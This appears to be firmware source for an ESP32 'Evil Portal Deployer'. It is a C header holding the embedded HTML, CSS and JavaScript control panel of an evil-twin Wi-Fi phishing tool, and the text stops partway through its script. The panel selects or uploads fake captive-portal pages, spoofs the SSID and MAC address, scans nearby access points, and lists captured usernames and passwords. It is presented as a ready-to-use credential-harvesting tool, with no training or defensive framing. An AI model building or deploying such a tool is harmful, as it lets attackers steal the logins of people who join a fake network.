#ifndef INDEX_H
#define INDEX_H

const char HTML_DASHBOARD[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evil ESP32 - Portal Deployer 3000</title>
    <style>
        :root {
            --color-dark-bg-main: #0f172a; /* slate-900 */
            --color-dark-card-bg: #1e1b4b; /* indigo-950 */
            --color-dark-input-bg: #25254a; /* Adjusted for contrast */
            --color-purple-accent: #6366f1; /* indigo-500 */
            --color-purple-hover: #5855eb; /* indigo-500 darker hover */
            --color-gray-700: #374151; /* Used for scroll btn hover, some borders */
            --color-gray-700-50: rgba(55, 65, 81, 0.5); /* Semi-transparent for scroll btn */
            --color-toggle-inactive: #4B5563; /* Specific gray for toggle track */
            --color-green-dot: #22c55e; /* Emerald green for connected status */

            --color-text-white: #FFFFFF;
            --color-text-slate-400: #94a3b8; /* slate-400 */
            --color-text-indigo-300: #a5b4fc; /* indigo-300 */
        }

        /* Base / Reset Styles (Mimicking Tailwind's Preflight) */
        *, ::before, ::after {
            box-sizing: border-box;
            border-width: 0;
            border-style: solid;
            border-color: #e5e7eb; /* Default border color */
        }
        html {
            line-height: 1.5;
            -webkit-text-size-adjust: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; /* Your specified font */
            font-feature-settings: normal;
            font-variation-settings: normal;
        }
        body {
            margin: 0;
            line-height: inherit;
            background-color: var(--color-dark-bg-main);
            color: var(--color-text-white);
            min-height: 100vh;
            overflow-x: hidden; /* Ensure no horizontal scrolling */
        }
        hr {
            height: 0;
            color: inherit;
            border-top-width: 1px;
        }
        abbr:where([title]) {
            text-decoration: underline dotted;
        }
        h1, h2, h3, h4, h5, h6 {
            font-size: inherit;
            font-weight: inherit;
        }
        a {
            color: inherit;
            text-decoration: inherit;
        }
        b, strong {
            font-weight: bolder;
        }
        code, kbd, samp, pre {
            font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
            font-size: 1em;
            word-wrap: normal;
        }
        small {
            font-size: 80%;
        }
        sub, sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline;
        }
        sub {
            bottom: -0.25em;
        }
        sup {
            top: -0.5em;
        }
        table {
            text-indent: 0;
            border-color: inherit;
            border-collapse: collapse;
        }
        button, input, optgroup, select, textarea {
            font-family: inherit;
            font-feature-settings: inherit;
            font-variation-settings: inherit;
            font-size: 100%;
            font-weight: inherit;
            line-height: inherit;
            color: inherit;
            margin: 0;
            padding: 0;
        }
        button, select {
            text-transform: none;
        }
        button, [type='button'], [type='reset'], [type='submit'] {
            -webkit-appearance: button;
            background-color: transparent;
            background-image: none;
        }
        :-moz-focusring {
            outline: auto;
        }
        :-moz-ui-invalid {
            box-shadow: none;
        }
        progress {
            vertical-align: baseline;
        }
        ::-webkit-inner-spin-button, ::-webkit-outer-spin-button {
            height: auto;
        }
        [type='search'] {
            -webkit-appearance: textfield;
            outline-offset: -2px;
        }
        ::-webkit-search-decoration {
            -webkit-appearance: none;
        }
        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit;
        }
        summary {
            display: list-item;
        }
        blockquote, dl, dd, h1, h2, h3, h4, h5, h6, hr, figure, p, pre {
            margin: 0;
        }
        fieldset {
            margin: 0;
            padding: 0;
        }
        legend {
            padding: 0;
        }
        ol, ul, menu {
            list-style: none;
            margin: 0;
            padding: 0;
        }
        textarea {
            resize: vertical;
        }
        input::placeholder, textarea::placeholder {
            opacity: 1;
            color: var(--color-text-indigo-300); /* Use indigo-300 for placeholders */
        }
        [role="button"] {
            cursor: pointer;
        }
        :disabled {
            cursor: default;
        }
        img, svg, video, canvas, audio, iframe, embed, object {
            display: block;
            vertical-align: middle;
        }
        img, video {
            max-width: 100%;
            height: auto;
        }
        [hidden] {
            display: none;
        }

        /* Container and Content Wrapper */
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 28px 80px;
            background-color: var(--color-dark-bg-main);
            min-height: 100vh;
            width: 100%;
        }

        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            width: 100%;
            max-width: 1070px;
        }

        /* Header Styles */
        .header {
            width: 100%;
            margin-bottom: 40px;
            background-color: var(--color-dark-card-bg);
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .header-title {
            display: flex;
            gap: 20px;
            align-items: center;
            font-size: 24px;
            color: var(--color-text-white);
            margin-bottom: 8px;
        }

        .title-text {
            font-weight: 600;
        }

        /* New Emoji Styling */
        .header-emoji {
            font-size: 25px; /* Adjust size to fit */
            line-height: 1; /* Align vertically */
            display: inline-block;
            vertical-align: middle;
            margin-left: -5px; /* Adjust if needed for optical alignment */
        }

        .subtitle {
            font-size: 16px;
            color: var(--color-text-slate-400);
        }

        /* Main Grid Layout */
        .main-grid {
            display: grid;
            grid-template-columns: 64% 36%;
            gap: 20px;
            width: 100%;
        }

        /* Left Column Styles */
        .left-column {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* Portal Cards Row */
        .portal-cards-row {
            background-color: var(--color-dark-card-bg);
            border-radius: 24px;
            padding: 36px 20px;
        }

        .portal-cards-grid {
            display: flex;
            flex-wrap: nowrap;
            gap: 20px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }

        .portal-cards-grid::-webkit-scrollbar {
            display: none;
        }

        .portal-card {
            background-color: var(--color-dark-card-bg); /* Should match parent, not darker */
            border-radius: 24px;
            padding: 36px 20px;
            min-width: 280px;
            flex-shrink: 0;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .portal-card-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .portal-info {
            display: flex;
            gap: 24px;
            align-items: center;
        }

        .portal-icon {
            width: 45px;
            height: 45px;
            border-radius: 12px;
            object-fit: contain;
            fill: var(--color-text-white);
            background-color: var(--color-purple-accent);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .portal-text {
            display: flex;
            flex-direction: column;
        }

        .portal-label {
            font-size: 16px;
            color: var(--color-text-slate-400);
            margin-bottom: 6px;
        }

        .portal-name {
            font-size: 24px;
            color: var(--color-text-white);
        }

        /* Toggle Switch */
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 44px;
            height: 24px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-inner {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: var(--color-toggle-inactive);
            transition: .4s;
            border-radius: 34px;
        }

        .toggle-inner::before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: var(--color-text-white);
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .toggle-inner {
            background-color: var(--color-purple-accent);
        }

        input:focus + .toggle-inner {
            outline: none;
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
        }

        input:checked + .toggle-inner::before {
            transform: translateX(20px);
        }

        /* Access Points Section */
        .access-points-section {
            display: flex;
            flex-direction: column;
            padding: 24px;
            border-radius: 24px;
            background-color: var(--color-dark-card-bg);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .section-header {
            margin-bottom: 36px;
        }

        .section-title {
            font-size: 24px;
            color: var(--color-text-white);
        }

        .html-editor {
            width: 100%;
            padding: 16px;
            margin-bottom: 14px;
            font-size: 14px;
            color: var(--color-text-white); /* Ensure text is white */
            background-color: var(--color-dark-input-bg);
            border-radius: 8px;
            min-height: 176px;
            resize: vertical;
            border: 1px solid #303060; /* Specific input border */
            outline: none;
        }
        .html-editor:focus {
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
            border-color: var(--color-purple-accent);
        }
        /* Ensure placeholder color is correct for textarea */
        .html-editor::placeholder {
            color: var(--color-text-indigo-300);
        }

        .upload-button-container {
            align-self: flex-end;
        }

        .upload-button {
            padding: 8px 32px;
            font-size: 14px;
            color: var(--color-text-white);
            background-color: var(--color-purple-accent);
            border: none;
            border-radius: 12px;
            font-family: inherit;
            transition: background-color 0.2s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .upload-button:hover {
            background-color: var(--color-purple-hover);
        }

        /* Nearby Access Points */
        .nearby-access-points {
            display: flex;
            flex-direction: column;
            padding: 24px;
            width: 100%;
            border-radius: 24px;
            background-color: var(--color-dark-card-bg);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .nearby-title {
            font-size: 24px;
            color: var(--color-text-white);
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .scan-aps-button {
            padding: 4px 16px;
            font-size: 14px;
            color: var(--color-text-white);
            background-color: var(--color-purple-accent);
            border: none;
            border-radius: 8px;
            transition: background-color 0.2s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .scan-aps-button:hover {
            background-color: var(--color-purple-hover);
        }

        .access-points-table {
            width: 100%;
            overflow-y: auto;
            max-height: 300px;
            scrollbar-width: thin;
            scrollbar-color: var(--color-purple-accent) var(--color-dark-card-bg);
        }
        .access-points-table::-webkit-scrollbar {
            width: 8px;
        }
        .access-points-table::-webkit-scrollbar-track {
            background: var(--color-dark-card-bg);
            border-radius: 10px;
        }
        .access-points-table::-webkit-scrollbar-thumb {
            background: var(--color-purple-accent);
            border-radius: 10px;
        }

        .table-headers {
            display: grid;
            grid-template-columns: 1fr 1fr 0.5fr;
            gap: 20px;
            width: 100%;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            position: sticky;
            top: 0;
            background-color: var(--color-dark-card-bg);
            z-index: 5;
        }

        .column-header {
            font-size: 12px;
            color: var(--color-text-indigo-300);
            margin-bottom: 24px;
            font-weight: 500;
        }

        .network-item {
            margin-bottom: 16px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: var(--color-text-white);
        }
        .network-item:last-child {
            margin-bottom: 0;
        }
        
        .table-row-data {
            display: grid;
            grid-template-columns: 1fr 1fr 0.5fr;
            gap: 20px;
            padding-top: 16px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            color: var(--color-text-white); /* Ensure data text is white */
        }
        .table-row-data:last-of-type {
            border-bottom: none;
        }
        /* Specific alignment for table data */
        .table-row-data > div {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        /* Right Column Styles */
        .right-column {
            width: 100%;
            color: var(--color-text-white);
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* Access Point Configuration */
        .access-point-config {
            display: flex;
            flex-direction: column;
            padding: 24px;
            border-radius: 24px;
            background-color: var(--color-dark-card-bg);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .config-title {
            font-size: 24px;
            margin-bottom: 24px;
            color: var(--color-text-white);
            display: flex; /* Added for alignment with connected status */
            justify-content: space-between; /* Added for alignment with connected status */
            align-items: center; /* Added for alignment with connected status */
        }

        .connected-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 16px;
            color: var(--color-text-slate-400);
        }

        .green-dot {
            width: 10px;
            height: 10px;
            background-color: var(--color-green-dot);
            border-radius: 50%;
            display: inline-block;
        }

        .config-field {
            margin-bottom: 24px;
        }

        .field-label {
            font-size: 16px;
            color: var(--color-text-slate-400);
            margin-bottom: 4px;
        }

        .field-value {
            font-size: 24px;
            color: var(--color-text-white);
            font-weight: 500;
        }

        .config-inputs {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin: 64px 0 12px;
            width: 100%;
        }

        .config-input {
            padding: 16px;
            font-size: 14px;
            color: var(--color-text-white);
            background-color: var(--color-dark-input-bg);
            border: 1px solid #303060;
            border-radius: 8px;
            font-family: inherit;
            outline: none;
        }
        .config-input::placeholder {
            color: var(--color-text-indigo-300);
        }
        .config-input:focus {
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
            border-color: var(--color-purple-accent);
        }

        .apply-button {
            padding: 16px 32px;
            font-size: 14px;
            color: var(--color-text-white);
            background-color: var(--color-purple-accent);
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-family: inherit;
            transition: background-color 0.2s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 100%;
        }

        .apply-button:hover {
            background-color: var(--color-purple-hover);
        }

        /* Credentials Section */
        .credentials-section {
            display: flex;
            flex-direction: column;
            padding: 24px;
            font-size: 14px;
            border-radius: 24px;
            background-color: var(--color-dark-card-bg);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            flex-grow: 1;
        }

        .credentials-title {
            font-size: 24px;
            margin-bottom: 24px;
            color: var(--color-text-white);
        }

        .credentials-table {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            width: 100%;
            overflow-y: auto;
            max-height: 220px;
            scrollbar-width: thin;
            scrollbar-color: var(--color-purple-accent) var(--color-dark-card-bg);
        }
        .credentials-table::-webkit-scrollbar {
            width: 8px;
        }
        .credentials-table::-webkit-scrollbar-track {
            background: var(--color-dark-card-bg);
            border-radius: 10px;
        }
        .credentials-table::-webkit-scrollbar-thumb {
            background: var(--color-purple-accent);
            border-radius: 10px;
        }

        .credentials-header {
            font-size: 12px;
            color: var(--color-text-indigo-300);
            margin-bottom: 20px;
            font-weight: 500;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 8px;
        }

        .credential-item {
            margin-bottom: 16px;
            color: var(--color-text-white);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .credential-item:last-child {
            margin-bottom: 0;
        }

        /* Responsive Design */
        @media (max-width: 1023px) {
            .main-grid {
                grid-template-columns: 1fr;
                gap: 28px;
            }
            .container {
                padding: 28px 40px;
            }
            .header {
                padding: 20px;
            }
            .portal-cards-row, .access-points-section, .nearby-access-points, .access-point-config, .credentials-section {
                padding: 20px;
            }
        }

        @media (max-width: 767px) {
            .container {
                padding: 28px 20px;
            }
            .header-title {
                max-width: 100%;
                justify-content: flex-start;
                gap: 8px; /* Slightly reduced gap for very small screens */
            }
            /* Adjust font sizes for better fit on small screens */
            .header-title .title-text {
                font-size: 20px; /* Smaller font size for the main title */
            }
            .subtitle {
                font-size: 14px; /* Smaller font for subtitle */
            }
            .html-editor {
                min-height: 112px;
            }
            .upload-button-container {
                align-self: center;
            }
            .access-points-table, .credentials-table {
                grid-template-columns: 1fr 1fr 0.5fr;
                gap: 10px;
                font-size: 12px;
            }
            .table-headers {
                gap: 10px;
            }
            .table-row-data {
                gap: 10px;
            }
            .config-inputs {
                max-width: 100%;
            }
        }
        
        /* Scroll Button Styling */
        .scroll-button-container {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            z-index: 10;
            padding: 8px;
            border-radius: 9999px;
            background-color: var(--color-gray-700-50);
            cursor: pointer;
            transition: background-color 0.2s ease-in-out;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .scroll-button-container:hover {
            background-color: var(--color-gray-700);
        }
        .scroll-button-container.left { left: 0; }
        .scroll-button-container.right { right: 0; }
        .scroll-button-container svg { fill: var(--color-text-white); width: 24px; height: 24px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="content-wrapper">
            <!-- Header Section -->
            <div class="header">
                <div class="header-title">
                    <div class="title-text">Evil ESP32</div>
                    <span class="header-emoji">👋</span>
                </div>
                <div class="subtitle">Evil Portal Deployer 3000</div>
            </div>
            <div class="main-grid">
                <!-- Left Column -->
                <div class="left-column">
                    <!-- Portal Cards Row -->
                    <div class="portal-cards-row">
                        <div class="section-title" style="margin-bottom: 24px;">Portal</div>
                        <div style="position: relative;">
                            <div id="portals-container" class="portal-cards-grid">
                                <!-- Portal Cards will be dynamically generated by JavaScript here -->
                            </div>
                            <!-- Scroll Buttons (now permanently hidden as there's only one card) -->
                            <button id="scroll-left" class="scroll-button-container left" style="display: none;">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256"><path d="M160,208a8,8,0,0,1-5.6,2.4,8,8,0,0,1-5.6-2.4l-80-80a8,8,0,0,1,0-11.2l80-80a8,8,0,0,1,11.2,11.2L85.6,128l74.4,74.4A8,8,0,0,1,160,208Z"></path></svg>
                            </button>
                            <button id="scroll-right" class="scroll-button-container right" style="display: none;">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256"><path d="M96,208a8,8,0,0,0,5.6,2.4,8,8,0,0,0,5.6-2.4l80-80a8,8,0,0,0,0-11.2l-80-80a8,8,0,0,0-11.2,11.2L170.4,128,96,202.4A8,8,0,0,0,96,208Z"></path></svg>
                            </button>
                        </div>
                    </div>
                    <div class="access-points-section">
                        <div class="section-header">
                            <div class="section-title">Custom Portal</div>
                        </div>
                        <textarea id="html-code-input" class="html-editor" placeholder="Paste your custom HTML code here..."></textarea>
                        <div class="upload-button-container">
                            <button id="upload-portal-button" class="upload-button">Upload & Activate</button>
                        </div>
                    </div>

                    <!-- Nearby Access Points Section -->
                    <div class="nearby-access-points">
                        <div class="nearby-title">
                            Nearby Access Points
                            <button id="scan-aps-button" class="scan-aps-button">Scan APs</button>
                        </div>
                        <div class="access-points-table">
                            <div class="table-headers">
                                <div class="column-header">SSID</div>
                                <div class="column-header">Mac Address</div>
                                <div class="column-header">RSSI</div>
                            </div>
                            <div id="nearby-aps-tbody">
                            </div>
                            <div class="table-row-data" style="font-style: italic; color: var(--color-text-slate-400); font-size: 14px;">
                                <div style="grid-column: span 3; text-align: center; padding-top: 16px;">
                                    No access points found. Click 'Scan APs' to search.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Right Column -->
                <div class="right-column">
                    <!-- Access Point Configuration -->
                    <div class="access-point-config">
                        <div class="config-title">
                            Access Point
                            <div class="connected-status">
                                <span class="green-dot"></span>
                                Connected: <span id="connected-clients-count">0</span>
                            </div>
                        </div>
                        <div class="config-field">
                            <div class="field-label">SSID</div>
                            <div id="current-ssid" class="field-value">ESP32 Network</div>
                        </div>
                        <div class="config-field">
                            <div class="field-label">Mac Address</div>
                            <div id="current-mac" class="field-value">FF:FF:FF:FF:FF:FF</div>
                        </div>
                        <div class="config-inputs">
                            <input type="text" id="ssid-input" class="config-input" placeholder="New SSID">
                            <input type="text" id="mac-input" class="config-input" placeholder="New Mac Address (XX:XX:XX:XX:XX:XX)">
                        </div>
                        <button id="apply-changes-button" class="apply-button">Apply Changes</button>
                    </div>

                    <!-- Credentials Section -->
                    <div class="credentials-section">
                        <div class="credentials-title">Credentials</div>
                        <div id="credentials-table-body" class="credentials-table">
                            <div class="credentials-column">
                                <div class="credentials-header">Username</div>
                                <!-- Credentials will be inserted here by JavaScript -->
                            </div>
                            <div class="credentials-column">
                                <div class="credentials-header">Password</div>
                                <!-- Credentials will be inserted here by JavaScript -->
                            </div>
                        </div>
                        <div id="credentials-scroll-hint" class="credential-item" style="color: var(--color-text-slate-400); font-style: italic; margin-top: 16px; width: 100%; text-align: center; white-space: nowrap;">
                            No credentials captured yet.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const htmlCodeInput = document.getElementById('html-code-input');
            const uploadButton = document.getElementById('upload-portal-button');
            const portalsContainer = document.getElementById('portals-container'); 
            const scrollLeftBtn = document.getElementById('scroll-left');
            const scrollRightBtn = document.getElementById('scroll-right');
            const scanApsButton = document.getElementById('scan-aps-button');
            const ssidInput = document.getElementById('ssid-input');
            const macInput = document.getElementById('mac-input');
            const applyChangesButton = document.getElementById('apply-changes-button');
            const currentSsidDisplay = document.getElementById('current-ssid');
            const currentMacDisplay = document.getElementById('current-mac');
            const connectedClientsCount = document.getElementById('connected-clients-count'); 
            const credentialsTableBody = document.getElementById('credentials-table-body');
            const nearbyApsTbody = document.getElementById('nearby-aps-tbody');
            const credentialsScrollHint = document.getElementById('credentials-scroll-hint');

            // --- API Communication Functions ---
            async function fetchData(url) {
                try {
                    const response = await fetch(url);
                    if (!response.ok) {
                        console.error(`HTTP error! status: ${response.status} from ${url}`);
                        return null;
                    }
                    return await response.json();
                } catch (error) {
                    console.error('Fetch error for ' + url + ':', error);
                    return null;
                }
            }

            async function postData(url, data) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams(data).toString()
                    });
                    if (!response.ok) {
                        console.error(`HTTP error! status: ${response.status} from ${url}`);
                        return null;
                    }
                    return await response.json();
                } catch (error) {
                    console.error('Post error for ' + url + ':', error);
                    return null;
                }
            }

            // --- UI Update Functions ---
            async function getAndRenderPortals() {
                const availablePortals = await fetchData('/api/portals'); 
                const activePortalData = await fetchData('/api/active_portal'); 
                const currentActivePortalName = activePortalData ? activePortalData.activePortal : 'None';

                portalsContainer.innerHTML = '';

                if (availablePortals && availablePortals.length > 0) {
                    availablePortals.forEach(name => {
                        // Fishing Hook SVG for all portals
                        const fishingHookSVG = `
                            <svg fill="currentColor" height="24px" width="24px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 494.729 494.729" xml:space="preserve">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier"> 
                                    <path d="M200.615,335.102l-0.263-0.001c-10.629,0-19.39,8.648-19.53,19.277c-0.022,1.621,0.175,3.207,0.536,4.745l-26.594,17.755 c-0.732-0.157-1.489-0.244-2.268-0.244c-5.951,0-10.776,4.825-10.776,10.776s4.825,10.776,10.776,10.776 c5.286,0,9.674-3.809,10.591-8.83l27.071-18.074c2.966,1.824,6.368,2.842,9.94,2.89l0.263,0.001c10.629,0,19.39-8.648,19.53-19.276 c0.07-5.218-1.896-10.151-5.538-13.89C210.711,337.269,205.833,335.171,200.615,335.102z M200.36,359.173l-0.063,0 c-1.212-0.016-2.346-0.503-3.19-1.371c-0.846-0.868-1.302-2.013-1.286-3.225c0.033-2.468,2.065-4.476,4.595-4.476h0.001 c1.212,0.016,2.345,0.503,3.19,1.371s1.302,2.013,1.286,3.226C204.859,357.166,202.827,359.173,200.36,359.173z M404.148,283.415 c-2.73-3.115-7.469-3.427-10.584-0.697s-3.427,7.468-0.697,10.583c2.753,3.14,2.438,7.934-0.703,10.687 c-1.521,1.333-3.477,1.992-5.488,1.861c-2.019-0.132-3.863-1.043-5.197-2.564c-1.333-1.521-1.994-3.471-1.861-5.489 s1.043-3.864,2.564-5.197c0.02-0.017,0.036-0.036,0.055-0.053c0.123-0.109,0.238-0.225,0.352-0.341 c0.062-0.063,0.127-0.125,0.187-0.19c0.104-0.114,0.201-0.233,0.297-0.353c0.062-0.076,0.125-0.151,0.184-0.229 c0.08-0.108,0.153-0.22,0.226-0.331c0.064-0.096,0.131-0.192,0.19-0.29c0.058-0.098,0.109-0.199,0.163-0.299 c0.063-0.116,0.127-0.231,0.183-0.35c0.043-0.092,0.08-0.186,0.119-0.279c0.055-0.13,0.111-0.259,0.159-0.391 c0.034-0.095,0.061-0.192,0.091-0.288c0.041-0.132,0.084-0.263,0.118-0.397c0.028-0.109,0.047-0.22,0.07-0.331 c0.025-0.122,0.053-0.244,0.072-0.367c0.02-0.128,0.031-0.257,0.044-0.386c0.011-0.108,0.026-0.215,0.032-0.323 c0.009-0.141,0.007-0.282,0.008-0.424c0-0.098,0.004-0.195,0.001-0.293c-0.005-0.143-0.02-0.285-0.033-0.428 c-0.009-0.098-0.015-0.197-0.028-0.294c-0.018-0.132-0.045-0.263-0.07-0.395c-0.021-0.11-0.038-0.22-0.064-0.329 c-0.026-0.113-0.061-0.224-0.093-0.336c-0.036-0.128-0.071-0.256-0.115-0.382c-0.032-0.092-0.07-0.183-0.106-0.275 c-0.055-0.143-0.111-0.286-0.176-0.427c-0.037-0.079-0.079-0.157-0.119-0.235c-0.074-0.147-0.149-0.292-0.234-0.435 c-0.013-0.022-0.023-0.045-0.036-0.067L226.791,23.293c1.792-3.981,1.958-8.588,0.267-12.846C224.537,4.101,218.5,0,211.676,0 h-0.299c-3.866,0-7.62,1.352-10.569,3.806c-37.604,31.286-66.823,69.147-86.844,112.532 c-19.222,41.654-28.969,86.073-28.971,132.023v238.867c0,4.142,3.357,7.5,7.5,7.5h27.31c4.143,0,7.5-3.358,7.5-7.5v-68.68 c6.888,5.584,15.654,8.938,25.191,8.938c22.099,0,40.077-17.979,40.077-40.077c0-4.142-3.357-7.5-7.5-7.5s-7.5,3.358-7.5,7.5 c0,13.827-11.25,25.077-25.077,25.077s-25.076-11.25-25.076-25.077s11.249-25.077,25.076-25.077c3.5,0,6.883,0.705,10.054,2.095 c3.791,1.662,8.217-0.064,9.88-3.858c1.663-3.793-0.064-8.217-3.858-9.88c-5.081-2.227-10.489-3.356-16.075-3.356 c-9.537,0-18.303,3.354-25.191,8.938v-10.947l11.277-14.474c20.141-25.85,20.098-61.924-0.104-87.726l-8.506-10.864l18.368-23.888 c19.896-25.874,26.711-58.859,18.698-90.498l-1.387-5.474l7.225-2.689c27.13-10.097,46.597-34.634,50.443-63.151l144.743,239.71 c-1.979,3.138-3.163,6.734-3.413,10.54c-0.396,6.016,1.575,11.826,5.549,16.36c3.975,4.534,9.477,7.25,15.493,7.645 c0.506,0.033,1.011,0.05,1.514,0.05c5.472,0,10.694-1.959,14.847-5.599C411.411,307.064,412.351,292.774,404.148,283.415z M112.303,479.729h-12.31l0.001-231.367c0.002-89.717,40.244-174.651,110.407-233.025c0.257-0.214,0.612-0.336,0.976-0.336h0.299 c0.696,0,1.182,0.332,1.441,0.985c0.379,0.953-0.175,1.476-0.356,1.647c-32.625,30.769-57.906,66.947-75.145,107.529 c-16.374,38.547-24.8,79.326-25.055,121.242c-0.169,0.625-0.259,1.283-0.259,1.961V479.729z M127.303,320.888v-67.666 C142.416,273.282,142.422,300.818,127.303,320.888z M136.449,199.23l-6.084,7.912c3.85-28.21,11.649-55.455,23.134-81.145 C158.697,151.774,152.596,178.231,136.449,199.23z M169.656,94.864c10.971-18.383,24.011-35.718,38.968-51.772 C206.076,66.07,191.007,86.068,169.656,94.864z"></path> 
                                </g>
                            </svg>
                        `;

                        const portalCardHtml = `
                            <div class="portal-card" data-portal-name="${name}">
                                <div class="portal-card-content">
                                    <div class="portal-info">
                                        <span class="portal-icon">
                                            ${fishingHookSVG}
                                        </span>
                                        <div class="portal-text">
                                            <div class="portal-label">Portal</div>
                                            <div class="portal-name">${name}</div>
                                        </div>
                                    </div>
                                    <label class="toggle-switch">
                                        <input type="checkbox" data-portal-toggle="${name}">
                                        <span class="toggle-inner"></span>
                                    </label>
                                </div>
                            </div>
                        `;
                        portalsContainer.insertAdjacentHTML('beforeend', portalCardHtml);
                    });
                } else {
                    portalsContainer.innerHTML = '<div style="color: var(--color-text-slate-400); text-align: center; width: 100%;">No pre-defined portals available.</div>';
                }

                
                document.querySelectorAll('.toggle-switch input[type="checkbox"]').forEach(toggle => {
                    const portalName = toggle.dataset.portalToggle;
                    toggle.checked = (portalName === currentActivePortalName);
                });
                document.querySelectorAll('.toggle-switch input[type="checkbox"]').forEach(toggle => {
                    toggle.addEventListener('change', async (event) => {
                        const selectedPortalName = event.target.dataset.portalToggle;
                        if (event.target.checked) {
                            document.querySelectorAll('.toggle-switch input[type="checkbox"]').forEach(otherToggle => {
                                if (otherToggle !== event.target) {
                                    otherToggle.checked = false;
                                }
                            });
                            console.log(`Attempting to activate portal: ${selectedPortalName}`);
                            const result = await postData('/select_portal', { portalName: selectedPortalName });
                            if (result && result.status === 'success') {
                                console.log(`Portal changed to ${selectedPortalName}: ${result.message}`);
                            } else {
                                console.error(`Failed to activate ${selectedPortalName} portal:`, result ? result.message : 'Unknown error');
                                event.target.checked = false;
                                getAndRenderPortals(); 
                            }
                        } else {
                            console.log(`Deactivating portal: ${selectedPortalName}`);
                            const result = await postData('/select_portal', { portalName: "None" });
                            if (result && result.status === 'success') {
                                console.log(`Portal deactivated: ${result.message}`);
                            } else {
                                console.error(`Failed to deactivate portal:`, result ? result.message : 'Unknown error');
                                event.target.checked = true;
                                getAndRenderPortals(); 
                            }
                        }
                    });
                });

                const numPortals = availablePortals ? availablePortals.length : 0;
                if (numPortals <= 1) {
                    scrollLeftBtn.style.display = 'none';
                    scrollRightBtn.style.display = 'none';
                } else {
                    scrollLeftBtn.style.display = 'flex';
                    scrollRightBtn.style.display = 'flex';
                }
            }

            async function getAndUpdateAccessPointDetails() {
                const settings = await fetchData('/api/settings');
                if (settings) {
                    currentSsidDisplay.textContent = settings.ssid;
                    currentMacDisplay.textContent = settings.mac;
                    ssidInput.value = settings.ssid;
                    macInput.value = settings.mac;
                } else {
                    currentSsidDisplay.textContent = "ESP32 Network";
                    currentMacDisplay.textContent = "FF:FF:FF:FF:FF:FF";
                    ssidInput.value = "ESP32 Network";
                    macInput.value = "FF:FF:FF:FF:FF:FF";
                }
            }

            async function getAndUpdateConnectedClients() {
                const clientData = await fetchData('/api/connected_clients');
                if (clientData) {
                    connectedClientsCount.textContent = clientData.connectedClients;
                } else {
                    connectedClientsCount.textContent = "0";
                }
            }

            async function getAndUpdateCredentialsTable() {
                const attempts = await fetchData('/api/login_attempts');
                const finalAttempts = attempts;

